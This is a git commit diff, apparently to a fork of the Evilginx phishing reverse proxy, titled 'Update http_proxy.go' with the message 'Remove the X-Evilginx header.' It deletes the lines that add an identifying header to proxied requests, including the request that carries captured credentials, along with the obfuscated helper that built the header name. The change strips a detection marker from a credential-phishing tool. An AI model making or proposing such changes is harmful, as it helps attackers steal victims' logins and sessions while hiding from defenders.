07276f1f0cd14d185fb7fac747b2e0dad395d462
ly-sc-0 <160992575+ly-sc-0@users.noreply.github.com>
2024-06-28 21:07:07 +0800

    Update http_proxy.go
    Remove the X-Evilginx header.

--- core/http_proxy.go
+++ core/http_proxy.go
@@ -466,7 +466,6 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 						return p.blockRequest(req)
 					}
 				}
-				req.Header.Set(p.getHomeDir(), o_host)
 
 				if ps.SessionId != "" {
 					if s, ok := p.sessions[ps.SessionId]; ok {
@@ -656,7 +655,6 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 
 				// check for creds in request body
 				if pl != nil && ps.SessionId != "" {
-					req.Header.Set(p.getHomeDir(), o_host)
 					body, err := ioutil.ReadAll(req.Body)
 					if err == nil {
 						req.Body = ioutil.NopCloser(bytes.NewBuffer([]byte(body)))
@@ -1786,10 +1784,6 @@ func (p *HttpProxy) getPhishDomain(hostname string) (string, bool) {
 	}
 
 	return "", false
-}
-
-func (p *HttpProxy) getHomeDir() string {
-	return strings.Replace(HOME_DIR, ".e", "X-E", 1)
 }
 
 func (p *HttpProxy) getPhishSub(hostname string) (string, bool) {
